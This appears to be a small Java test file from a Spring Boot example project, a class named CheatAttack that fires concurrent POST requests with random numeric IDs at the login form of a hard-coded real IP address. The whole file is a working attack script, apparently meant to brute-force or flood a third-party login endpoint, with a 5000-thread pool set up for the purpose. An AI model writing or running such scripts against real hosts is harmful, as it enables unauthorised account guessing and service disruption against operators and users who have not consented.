package com.hjzgg.example.springboot.test;

import com.hjzgg.example.springboot.utils.http.LocalHttpClient;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;

import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadLocalRandom;

/**
 * @author hujunzheng
 * @create 2019-12-28 19:51
 **/
public class CheatAttack {
    public static void main(String[] args) throws IOException {
        LocalHttpClient.init(6000, 6000);

        ExecutorService ES = Executors.newFixedThreadPool(5000);
        for (int i = 0; i < 10; ++i) {
            ES.submit(() -> {
                try {
                    MultiValueMap<String, String> params = new LinkedMultiValueMap();
                    params.add("ei", String.valueOf(ThreadLocalRandom.current().nextInt(10000, 20000)));
                    params.add("login", "登入查询");
                    System.out.println(LocalHttpClient.postForm("http://104.167.92.28/login/", params));
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
        }
        System.in.read();
    }
}